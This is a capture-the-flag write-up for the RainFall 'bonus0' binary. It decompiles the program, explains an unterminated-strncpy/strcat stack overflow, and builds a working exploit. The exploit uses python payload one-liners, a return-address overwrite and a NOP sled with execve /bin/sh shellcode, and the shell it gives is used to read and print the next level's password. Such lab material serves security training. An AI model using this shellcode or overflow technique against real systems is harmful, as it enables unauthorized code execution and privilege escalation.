# Bonus0

```sh
(gdb) info func
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  read
0x08048380  read@plt
0x08048390  strcat
0x08048390  strcat@plt
0x080483a0  strcpy
0x080483a0  strcpy@plt
0x080483b0  puts
0x080483b0  puts@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  strchr
0x080483d0  strchr@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  strncpy
0x080483f0  strncpy@plt
0x08048400  _start
0x08048430  __do_global_dtors_aux
0x08048490  frame_dummy
0x080484b4  p
0x0804851e  pp
0x080485a4  main
0x080485d0  __libc_csu_init
0x08048640  __libc_csu_fini
0x08048642  __i686.get_pc_thunk.bx
0x08048650  __do_global_ctors_aux
0x0804867c  _fini
(gdb) 
```

```sh
bonus0@RainFall:~$ ls
bonus0
bonus0@RainFall:~$ ./bonus0 
 - 
hey
 - 
lol
hey lol
bonus0@RainFall:~$ ./bonus0 
 - 
haha haha
 - 
jaja
haha haha jaja
bonus0@RainFall:~$ ./bonus0 lol
 - 

 - 

 
bonus0@RainFall:~$ 

```

Ghidra :


```c
void pp(char *param_1)

{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  byte bVar4;
  char local_34 [20];
  char local_20 [20];
  
  bVar4 = 0;
  p(local_34," - ");
  p(local_20," - ");
  strcpy(param_1,local_34);
  uVar2 = 0xffffffff;
  pcVar3 = param_1;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  *(undefined2 *)(param_1 + (~uVar2 - 1)) = 0x20;
  strcat(param_1,local_20);
  return;
}

void p(char *param_1,char *param_2)

{
  char *pcVar1;
  char local_100c [4104];
  
  puts(param_2);
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
  return;
}

undefined4 main(void)
{
  char local_3a [54];
  
  pp(local_3a);
  puts(local_3a);
  return 0;
}
```

Lets explain what it does :

The program create a buffer and call the pp() function.

The pp() function create 2 buffer that is filled by the call of the p() function.

And the P function create a big buffer and fill it with the input of the user.

It then search for a '\n' and replace it with a \0.

The buffer is then coppied by a maximum of 20 to the small buffer.

The result give this :


```sh
bonus0@RainFall:~$ ./bonus0 
 - 
John
 - 
Mclane
John Mclane
bonus0@RainFall:~$
```


Pressing ENTER give us the input to the second buffer.

It then get printed in the main function.

There is no overflow vulnerability in any of the input.

```c
read(0,local_100c,0x1000);
```

This read(), is limited to 4096 which is probably the size of the buffer (Ghidra is not precise on source code, and i already tested, no overflow possible.)

So how can we exploit that ?

Actually our input doesn't contain any '\0', the program only replace '\n' with \0.

But the only way to give our input is by giving a \n.

But we know only the 20 first character of our input will be given to the rest of the programs. So if we give more then 20char wihtout \n we will have a string that doesn't have a NULL terminated character !

Lets test it 

With > 20 A in the input :

```sh
bonus0@RainFall:~$ ./bonus0 
 - 
AAAAAAAAAAAAAAAAAAAAA
 - 
AAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��� AAAAAAAAAAAAAAAAAAAA���
Segmentation fault (core dumped)
bonus0@RainFall:~$ 
```

And it segfaulted, we can more details on it using ltrace.

```sh
bonus0@RainFall:~$ ltrace ./bonus0 
__libc_start_main(0x80485a4, 1, 0xbffff804, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - 
)                                                             = 4
read(0, AAAAAAAAAAAAAAAAAAAAA
"AAAAAAAAAAAAAAAAAAAAA\n", 4096)                                = 22
strchr("AAAAAAAAAAAAAAAAAAAAA\n", '\n')                                 = "\n"
strncpy(0xbffff6e8, "AAAAAAAAAAAAAAAAAAAA", 20)                         = 0xbffff6e8
puts(" - " - 
)                                                             = 4
read(0, AAAAAAAAAAAAAAAAAAAAA
"AAAAAAAAAAAAAAAAAAAAA\n", 4096)                                = 22
strchr("AAAAAAAAAAAAAAAAAAAAA\n", '\n')                                 = "\n"
strncpy(0xbffff6fc, "AAAAAAAAAAAAAAAAAAAA", 20)                         = 0xbffff6fc
strcpy(0xbffff736, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)               = 0xbffff736
strcat("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., "AAAAAAAAAAAAAAAAAAAA\364\017\375\267") = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...
puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��� AAAAAAAAAAAAAAAAAAAA���
)                             = 70
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
bonus0@RainFall:~$ 
```

As you saw, we actually segfaulted at the last print of the main.

Since our buffer doesn't end, the printf will go through the hole memory of the program, and will end up segfaulting by reading an address it should not to.


```sh
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAAA
 - 
AAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��� AAAAAAAAAAAAAAAAAAAA���

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

From there we can overflow things.

We are going to overflow using the buffer, we know our buffer's size is 4096, so we have to remove the \0, and then use an offset of 4096 to start overwriting.

After a few try and adjustement, we now control the EIP

```sh
bonus0@RainFall:~$ python -c "print 'A' * 20 + '\n' + 'B' * 20 + '\x90' * 4068 + 'AAAAAA'" > /tmp/payload
bonus0@RainFall:~$ gdb ./bonus0 -q
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run < /tmp/payload
Starting program: /home/user/bonus0/bonus0 < /tmp/payload
 - 
 - 
AAAAAAAAAAAAAAAAAAAA�������������AAAAAA �������������AAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Lets try and give him the system() function.

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system
(gdb)

bonus0@RainFall:~$ python -c "print 'A' * 20 + '\n' + 'B' * 20 + '\x90' * 4069 + '\x60\xb0\xe6\xb7'" > /tmp/payload
bonus0@RainFall:~$ gdb ./bonus0 -q
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run < /tmp/payload
Starting program: /home/user/bonus0/bonus0 < /tmp/payload
 - 
 - 
AAAAAAAAAAAAAAAAAAAA��������������`�� ��������������`��

Program received signal SIGSEGV, Segmentation fault.
0x00b7e6b0 in ?? ()

```

Our address contain an offset, we can fix it by adding an A next to it :


```sh
bonus0@RainFall:~$ python -c "print 'A' * 20 + '\n' + 'B' * 20 + '\x90' * 4069 + '\x60\xb0\xe6\xb7\x41'" > /tmp/payload
bonus0@RainFall:~$ gdb ./bonus0 -q
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run < /tmp/payload
Starting program: /home/user/bonus0/bonus0 < /tmp/payload
 - 
 - 
AAAAAAAAAAAAAAAAAAAA��������������`��A ��������������`��A
sh: 1: ����: not found

Program received signal SIGSEGV, Segmentation fault.
0x00000041 in ?? ()
```

And it did executed system(), but we dont have space to add an argument.

So we are going to change our approache and insert a shellcode, since we control the EIP we can make it point to a shellcode, lets try this.

We are going to place our shellcode into av[1], and give the start of av[1] to the EIP.

In order to achieve that we are going to overwrite the return address of main with the address of av[1].

```sh
(gdb) disas main
  (...)
   0x080485cb <+39>:	ret    
End of assembler dump.
```

We now need av[1] address.

```sh
(gdb) run $(python -c "print 'A' * 1200")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0 $(python -c "print 'A' * 1200")

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/200x $esp
0xbffff288:	0x00000000	0xb7e454d3	0x00000002	0xbffff324
0xbffff298:	0xbffff330	0xb7fdc858	0x00000000	0xbffff31c
0xbffff2a8:	0xbffff330	0x00000000	0x0804824c	0xb7fd0ff4
0xbffff2b8:	0x00000000	0x00000000	0x00000000	0xd13ca4d1
0xbffff2c8:	0xe670a0c1	0x00000000	0x00000000	0x00000000
0xbffff2d8:	0x00000002	0x08048400	0x00000000	0xb7ff26b0
0xbffff2e8:	0xb7e453e9	0xb7ffeff4	0x00000002	0x08048400
0xbffff2f8:	0x00000000	0x08048421	0x080485a4	0x00000002
0xbffff308:	0xbffff324	0x080485d0	0x08048640	0xb7fed280
0xbffff318:	0xbffff31c	0xb7fff918	0x00000002	0xbffff44b
0xbffff328:	0xbffff464	0x00000000	0xbffff915	0xbffff925
0xbffff338:	0xbffff939	0xbffff958	0xbffff96b	0xbffff977
0xbffff348:	0xbffffe98	0xbffffea4	0xbffffef1	0xbfffff07
0xbffff358:	0xbfffff16	0xbfffff2c	0xbfffff3d	0xbfffff46
0xbffff368:	0xbfffff5d	0xbfffff65	0xbfffff74	0xbfffffa1
0xbffff378:	0xbfffffc1	0x00000000	0x00000020	0xb7fdd418
0xbffff388:	0x00000021	0xb7fdd000	0x00000010	0x178bfbff
0xbffff398:	0x00000006	0x00001000	0x00000011	0x00000064
0xbffff3a8:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffff3b8:	0x00000005	0x00000008	0x00000007	0xb7fde000
0xbffff3c8:	0x00000008	0x00000000	0x00000009	0x08048400
0xbffff3d8:	0x0000000b	0x000007da	0x0000000c	0x000007da
0xbffff3e8:	0x0000000d	0x000007da	0x0000000e	0x000007da
0xbffff3f8:	0x00000017	0x00000000	0x00000019	0xbffff42b
0xbffff408:	0x0000001f	0xbfffffe3	0x0000000f	0xbffff43b
0xbffff418:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff428:	0x37000000	0xc27aa729	0xc2d7176c	0x7ed077bd
0xbffff438:	0x6942ac38	0x00363836	0x00000000	0x00000000
0xbffff448:	0x2f000000	0x656d6f68	0x6573752f	0x6f622f72
0xbffff458:	0x3073756e	0x6e6f622f	0x00307375	0x41414141
0xbffff468:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff478:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff488:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff498:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4a8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4b8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4c8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4d8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4e8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4f8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff508:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff518:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff528:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff538:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff548:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff558:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff568:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff578:	0x41414141	0x41414141	0x41414141	0x41414141
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) x/x 0xbffff45e
0xbffff45e:	0x73756e6f
(gdb) x/x 0xbffff45d
0xbffff45d:	0x756e6f62
(gdb) x/s 0xbffff45d
0xbffff45d:	 "bonus0"
(gdb) x/s 0xbffff45e
0xbffff45e:	 "onus0"
(gdb) x/s 0xbffff460
0xbffff460:	 "us0"
(gdb) x/s 0xbffff45f
0xbffff45f:	 "nus0"
(gdb) x/s 0xbffff460
0xbffff460:	 "us0"
(gdb) x/s 0xbffff468
0xbffff468:	 'A' <repeats 200 times>...
(gdb) x/s 0xbffff467
0xbffff467:	 'A' <repeats 200 times>...
(gdb) x/s 0xbffff460
0xbffff460:	 "us0"
(gdb) x/s 0xbffff462
0xbffff462:	 "0"
(gdb) x/s 0xbffff463
0xbffff463:	 ""
(gdb) x/s 0xbffff464
0xbffff464:	 'A' <repeats 200 times>...
```

av[1] start at 0xbffff464.

Lets assemble our exploit:

```sh
bonus0@RainFall:~$ python -c "print 'A' * 20 + '\n' + 'B' * 20 + '\x90' * 4064 + '\xcb\x85\x04\x08\x64\xf4\xff\xbf\x41\x41\x41'" > /tmp/payload
bonus0@RainFall:~$ gdb ./bonus0 -q
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run < /tmp/payload
Starting program: /home/user/bonus0/bonus0 < /tmp/payload
 - 
 - 
AAAAAAAAAAAAAAAAAAAA���������d���AAA��� ���������d���AAA���

Program received signal SIGSEGV, Segmentation fault.
0xbffff464 in ?? ()
(gdb) 

```

As you see we segfaulted at the very beggining of av[1].

I had to adjust the address and add 3 A in order to fix the offset, but we did overwrote the return of main with av[1].

All we need to do is fill av[1] with the shellcode and some NOP's and hope it works.


```sh
bonus0@RainFall:~$ ./bonus0 $(python -c "print '\x90' * 5000 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") < /tmp/payload
 - 
 - 
AAAAAAAAAAAAAAAAAAAA���������d���AAA��� ���������d���AAA���
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
$

```

So here i gave the script thats points to av[1] as an input, and then gave the shellcode in av[1].

I tried with 500 NOP's and it didn't worked, but with 5000 it executed a shell !